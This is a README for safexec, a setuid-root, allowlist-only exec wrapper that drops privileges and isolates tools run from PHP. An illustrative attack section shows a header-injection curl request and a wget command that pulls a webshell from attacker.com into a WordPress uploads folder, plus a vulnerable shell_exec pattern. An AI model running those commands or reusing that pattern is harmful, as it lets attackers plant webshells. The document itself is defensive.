# safexec

A small, allowlist-only, privilege-dropping `exec()` wrapper for running a
fixed set of external tools safely from a privileged or semi-privileged
caller — typically `shell_exec()`/`exec()`/`proc_open()` in PHP.

It was originally written as the execution backend for the **NPP (Nginx
Cache Purge Preload)** WordPress plugin, but the allowlist, isolation and
privilege-drop logic are entirely generic — `safexec` is useful anywhere
you need to run a small set of known binaries from a web app, cron job, or
service account without exposing a shell or arbitrary PATH lookups.

## Why

Calling `shell_exec("wget " . $input)` or similar from an application
means:

- if the command is built as a string and any part of it is
  attacker-influenced, it can break out of the intended argument and run
  arbitrary shell commands,
- the child inherits the caller's environment, open file descriptors,
  PATH, and resource limits,
- there is no cgroup/rlimit isolation, and
- there's no controlled way to later locate and terminate the process.

`safexec` addresses the last three — **when installed setuid-root** — by acting as a thin gatekeeper: it validates the request against a fixed allowlist, resolves the target binary to a trusted absolute path, sanitizes the environment, closes inherited file descriptors, drops privileges, and moves the process into its own cgroup v2 leaf (or applies POSIX rlimits as a fallback) before executing. 

By default, this isolation step groups and tracks the process for lifecycle control (e.g. --kill) rather than capping its CPU/memory/IO usage — actual resource ceilings require editing nppp_default_limits() at compile time. It also never invokes a shell itself, and rejects shell interpreters outright — which closes the first problem too, but only when the caller invokes `safexec` with an argument vector rather than a shell string; `safexec` cannot undo an injection that already happened in a `/bin/sh -c "..."` the caller built before calling it.

### Illustrative attack scenario
 
This is a generic `shell_exec()`-with-attacker-influenced-input pattern,
it's representative of the class of
bug `safexec` is designed to contain.
 
```sh
# Attacker injects a request header and triggers an endpoint that
# shells out based on it
curl -H "Referer: http://attacker.com/shell.php" https://example.com/preload-endpoint
 
# Vulnerable PHP code uses the header value directly in shell_exec(),
# e.g. shell_exec("wget " . $_SERVER['HTTP_REFERER'] . " -O ...")
```
 
**Without safexec**, the resulting command runs as the PHP-FPM worker, which is typically also the *owner* of
`wp-content/uploads/` (directory mode 755 — writable by its owner):
 
```sh
wget http://attacker.com/shell.php \
  -O /var/www/html/wp-content/uploads/shell.php
 
# → shell.php is written to a web-accessible path: persistent webshell (RCE)
```
 
**With safexec**, the same call is wrapped:
 
```sh
safexec wget http://attacker.com/shell.php \
  -O /var/www/html/wp-content/uploads/shell.php
 
Info: pinned tool 'wget' -> '/usr/bin/wget'
Info: using cgroup v2 child /sys/fs/cgroup/nppp/nppp.1397159
Info: Injected: LD_PRELOAD=/usr/lib/npp/libnpp_norm.so PCTNORM_CASE=upper (prog=wget)
Summary: user=65534:65534 (ruid=65534 rgid=65534) cwd=/var/www/ tool=/usr/bin/wget
Summary: no_new_privs=on
Summary: cgroup=/sys/fs/cgroup/nppp/nppp.1397159
 
/var/www/html/wp-content/uploads/shell.php: Permission denied
```
 
`safexec` drops the child to `nobody` before `execvp()`.
`nobody` is neither the owner nor group of `uploads/`, so the write that
previously succeeded via the owner bit now fails via the "other"
permission bits, and the webshell never lands. (That final
`Permission denied` line comes from `wget` itself, since by that point
`safexec` has already `execvp()`'d into it.)

## Allowlisted binaries

Built in by default:

| Category   | Binaries |
|------------|----------|
| Search     | `rg` |
| Fetch      | `wget`, `curl` |
| Archives   | `tar`, `gzip`, `gunzip`, `xz`, `unxz`, `zip`, `unzip` |
| Checksums  | `sha256sum`, `sha512sum`, `shasum`, `b2sum`, `cksum` |
| Media      | `ffmpeg`, `ffprobe`, `magick`, `convert`, `identify` |
| Documents  | `wkhtmltopdf`, `pdftk`, `pandoc` |

Optional, compile-time only (off by default — see [Build](#build)):

| Flag | Adds |
|------|------|
| `-DSAFEXEC_WITH_GS` | `gs` (Ghostscript — historically prone to PS/PDF-driven sandbox escapes; enable only if you need it) |
| `-DSAFEXEC_WITH_POPPLER` | `pdfinfo`, `pdftoppm`, `pdftocairo` |
| `-DSAFEXEC_WITH_DB` | `mysqldump`, `mysql`, `mariadb-dump`, `mariadb`, `pg_dump`, `pg_restore`, `psql`, `redis-cli` |
| `-DSAFEXEC_WITH_RSYNC_GIT` | `rsync`, `git` (both can shell out over SSH — enable only if you control their invocation) |

## Usage

```
safexec <program> [args...]
safexec --kill=<pid>
safexec --help | -h
safexec --version | -v
```

```sh
# Basic fetch, run through the allowlist and privilege-drop path
safexec wget -q -O /tmp/out.html https://example.com/

# Wrapper chaining
safexec nice -n 10 timeout 30 curl -fsSL https://example.com/ -o /tmp/out

# Terminate a safexec-spawned, nobody-owned process
safexec --kill=12345
```

Any binary not in the allowlist, or any attempt to run a shell as a
"wrapper", is rejected before privilege-sensitive code runs:

```
$ safexec /bin/sh -c 'id'
Info: rejecting shell interpreter before tool: '/bin/sh'
Error: 'sh' is not allowed by safexec.
```

### `rg` and directory ownership
 
`rg` (ripgrep) is treated specially: instead of dropping to `nobody`,
`safexec` `lstat()`s the last argument (expected to be an absolute
directory path) and drops to *that path's owning user* before executing
the search. Root-owned or symlinked target paths are refused.
 
The general principle: this mechanism earns its keep whenever the
identity a search needs is structurally different from, and unknown in
advance to, the caller's own fixed or known identity — a fixed `nobody`
drop can't read arbitrary per-tenant/per-service directories, and running
as root would defeat the point of dropping privileges at all. Resolving
the drop-UID from the target directory's owner at call time gives the
search exactly that owner's permissions, no more, no less, without
hardcoding who that owner is. (The original motivating case — an Nginx
cache directory owned by a different user than the calling PHP-FPM worker
— is just one instance of this.)

## Environment variables

| Variable | Values | Default | Effect |
|---|---|---|---|
| `SAFEXEC_DETACH` | `auto`, `cgv2`, `rlimits`, `off` | `auto` | Isolation strategy. `auto` prefers cgroup v2 and falls back to rlimits. Read via `secure_getenv()` on glibc. |
| `SAFEXEC_QUIET` | `0`/`1` | `0` | Suppress informational/summary output on stderr. |
| `SAFEXEC_SAFE_CWD` | `-1`, `0`, `1` | `-1` | If the CWD isn't writable, `chdir("/tmp")` (falls back to `/`). `-1` enables this only when a TTY is attached to stdio. |
| `SAFEXEC_PCTNORM` | `0`/`1` | `1` | Enable/disable injecting the `libnpp_norm.so` `LD_PRELOAD` shim for `wget`/`curl`. |
| `SAFEXEC_PCTNORM_SO` | path | `/usr/lib/npp/libnpp_norm.so` | Path to the shim. Only used if it passes [`is_secure_so()`](#pctnorm-shim) validation. |
| `SAFEXEC_PCTNORM_CASE` | `upper`, `lower`, `off` | `upper` | Forwarded to the shim as `PCTNORM_CASE`. |

Proxy variables `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY` (and
lowercase forms) may be passed as `NAME=value` tokens before the target
binary and are preserved through environment sanitization; all other
assignments are rejected.

## `libnpp_norm.so`

An optional `LD_PRELOAD` shared object that rewrites the hex-digit case of
`%xx` percent-encoded sequences in the *request-target* of the first
outgoing HTTP request line, for `wget`/`curl` only. This is useful when a
reverse-proxy cache treats differently-cased but otherwise identical
percent-encodings as distinct cache keys.

`safexec` will only inject this shim (via `LD_PRELOAD`) if the resolved
`.so`:

- is a regular file owned by `root:root`,
- is not group- or other-writable,
- resolves (via `realpath`) under one of `/usr/lib`, `/lib`, `/usr/lib64`,
  `/lib64`, and
- has the exact basename `libnpp_norm.so`.

Otherwise it silently skips injection and logs why (unless `SAFEXEC_QUIET=1`).

## Build

```sh
make                 # build ./build/safexec
make norm            # build ./build/libnpp_norm.so (opt-in, not part of `all`)
make check           # run tests/run.sh against the built binary
```

Standard override variables are respected: `CC`, `CFLAGS`, `CPPFLAGS`,
`LDFLAGS`, `DESTDIR`, `PREFIX` (default `/usr/local`; installs to
`$(PREFIX)/sbin`). No static linking or specific compiler is forced by
default.

Enable optional tool buckets at build time:

```sh
make EXTRA_CPPFLAGS="-DSAFEXEC_WITH_POPPLER -DSAFEXEC_WITH_DB -DSAFEXEC_WITH_RSYNC_GIT"
```

Static, musl-based release builds (require `zig cc` or an equivalent musl
cross toolchain):

```sh
make static            # build/safexec-x86_64-linux-musl
make static-aarch64    # build/safexec-aarch64-linux-musl
```

Build the pctnorm shim in wget-only fast-path mode:

```sh
make norm EXTRA_NORM_CPPFLAGS=-DWGET_FASTPATH
```

## Install

```sh
sudo make install
sudo chown root:root /usr/local/sbin/safexec
sudo chmod 4755 /usr/local/sbin/safexec   # setuid-root; avoid nosuid mounts
```

Without the setuid bit, `safexec` runs in pass-through mode (allowlist and
path-pinning only, no privilege drop or isolation).

To install the optional pctnorm shim:

```sh
sudo make install-norm            # installs to $(NPP_LIBDIR), default /usr/lib
```

`NPP_LIBDIR` must resolve under one of the trusted lib roots hardcoded in
`safexec.c` (`/usr/lib`, `/lib`, `/usr/lib64`, `/lib64`) — installing
elsewhere, including under a custom `PREFIX`, causes `safexec` to silently
skip `LD_PRELOAD` injection.

```sh
sudo make uninstall
```

## `--kill=<pid>`

Sends `SIGTERM` (via `pidfd_send_signal` where available, falling back to
`kill(2)`) to a PID, but only if:

- the PID's owning UID matches `nobody`, **and**
- the PID resides in a `safexec`-created `nppp.*` cgroup v2 leaf under
  `/sys/fs/cgroup/nppp` — or, if cgroup delegation isn't available in the
  current namespace, the target process has `NoNewPrivs` set (a
  kernel-enforced, one-way flag `safexec` itself sets before `exec`).

This is intentionally narrow: it lets a caller reap runaway children it
spawned via `safexec`, without granting a general-purpose kill capability.
Sending the signal is still subject to normal `kill(2)` permission rules
(matching UID or `CAP_KILL`) — in practice, killing a `nobody`-owned
target requires running `--kill` from the setuid-root binary itself.

## Limitations

- Allowlist-only, with no shell in the exec path: characters like `;`,
  `|`, or `` ` `` inside an argument are passed through literally to
  `execvp()` and never interpreted as shell syntax. This does not protect
  a caller that itself builds a shell string and hands that string to a
  shell before ever reaching `safexec` — the argument vector has to arrive
  unshelled for this guarantee to hold.
- Not a syscall sandbox — no seccomp filtering; isolation is limited to
  cgroups/rlimits on the child's resource usage.
- `--kill` and cgroup isolation are Linux-only; other POSIX platforms get
  rlimit-based isolation and no `--kill` support.
- Static binaries elsewhere on the system are unaffected by
  `LD_PRELOAD`-based normalization (`libnpp_norm.so`), by design.
